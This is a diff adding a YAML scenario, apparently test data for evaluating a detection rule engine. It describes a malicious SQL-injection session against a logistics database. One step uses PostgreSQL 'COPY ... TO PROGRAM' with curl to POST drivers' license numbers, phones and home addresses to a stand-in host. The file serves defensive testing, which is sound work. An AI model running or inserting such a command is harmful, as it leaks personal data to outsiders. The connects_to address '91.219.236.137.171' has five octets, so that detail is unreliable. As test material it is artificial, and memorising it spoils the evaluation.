@@ -1,0 +1,33 @@
+scenario_id: gen_logistics_62_sql_injection_mal_1653m
+family_id: gen_logistics_62_sql_injection_fam_1653
+domain: logistics
+time_of_day: 01:50
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: inject
+  role: partner_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 3.0
+  events:
+  - step_id: probe
+    sql: SELECT warehouse_id, name FROM warehouses WHERE shipment_id = 809246 AND
+      (SELECT count(*) FROM drivers) > 0
+  - step_id: exfil
+    sql: COPY (SELECT license_number, phone, home_address FROM drivers) TO PROGRAM
+      'curl -sX POST https://clearinghouse-batch.example/ingest -d @-'
+    connects_to:
+      ip: 91.219.236.137.171
+      port: 443
+matched_pair_id: gen_logistics_62_sql_injection_pair_1653
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
